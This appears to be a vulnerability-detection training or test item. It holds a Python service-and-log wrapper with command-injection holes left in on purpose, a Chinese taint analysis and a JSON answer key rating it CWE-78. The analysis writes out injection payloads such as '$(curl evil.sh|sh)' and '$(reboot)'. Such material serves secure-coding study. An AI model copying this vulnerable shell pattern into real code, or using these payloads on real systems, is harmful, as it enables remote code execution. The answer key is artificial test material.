@@ -1,0 +1,39 @@
+LANG: python
+```python
+"""ops_runner.py — 运维命令封装库，供上层服务/任务队列 worker 调用。"""
+
+import subprocess
+
+
+def run_service_action(service_name, action):
+    """对指定服务执行 start/stop/restart 等操作。
+
+    service_name 与 action 由上层调用方传入（可能来自工单系统或消息队列），
+    本库直接拼接到 shell 命令中执行。
+    """
+    # 弱防御：仅拦截分号与反引号
+    for ch in (";", "`"):
+        if ch in service_name or ch in action:
+            raise ValueError("illegal character")
+
+    cmd = "systemctl {} {}".format(action, service_name)
+    return subprocess.call(cmd, shell=True)
+
+
+def tail_log(path, lines=100):
+    """读取远端日志尾部，path 来自上层配置或队列消息。"""
+    if ".." in path:  # 仅防目录穿越，未防命令注入
+        raise ValueError("bad path")
+    cmd = "tail -n {} {}".format(lines, path)
+    return subprocess.check_output(cmd, shell=True)
+```
+
+1. 污点边界：本文件无 request/input/environ 等显式入口（第 5、14、24 行均无），但 `run_service_action(service_name, action)` 与 `tail_log(path, lines)` 是公开接口，参数承载上层服务/队列传入的外部数据，按不可信处理，为等效污点源。
+2. 数据流一：第 16 行黑名单仅过滤 `;` 和 `` ` ``，可被 `$()` 命令替换绕过——如 action 传 `restart $(reboot)`；第 19 行拼接后于第 20 行 `subprocess.call(cmd, shell=True)` 触发 CWE-78 sink。
+3. 数据流二：`tail_log` 第 26 行仅检查 `..` 防目录穿越，不防命令注入；path 含 `$(curl evil.sh|sh)` 时于第 28 行拼接并在第 29 行 `subprocess.check_output(cmd, shell=True)` 执行，第二处 sink 同样可达。
+4. 防御评估：两处均为黑名单/单字符检查类弱防御，位置在拼接前但覆盖面不足（未覆盖 `$()`、管道符、换行符等），shell=True 使元字符全部生效，无有效防御。
+5. 第二入口检查：文件内无路由注册、无其他 I/O 通道，唯一外部通道即上述两个公开函数的参数；两条 source→sink 链均无有效净化，确认存在漏洞。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 12: run_service_action 的 service_name/action 参数; line 24: tail_log 的 path 参数", "sink": "line 20: subprocess.call(cmd, shell=True); line 29: subprocess.check_output(cmd, shell=True)", "explanation": "service_name/action 经第16行黑名单(仅过滤分号和反引号, 可用 $() 绕过)后于第19行拼接进 systemctl 命令, 在第20行以 shell=True 执行; path 经第26行仅防目录穿越的检查后于第28行拼接进 tail 命令, 在第29行以 shell=True 执行; 两处均为弱防御且覆盖面不足, 外部可控数据直达命令注入 sink", "fix_suggestion": "line 20: 改用列表形式 subprocess.call(['systemctl', action, service_name], shell=False) 并对参数做白名单校验; line 29 同理改为 ['tail', '-n', str(lines), path]"}
+```
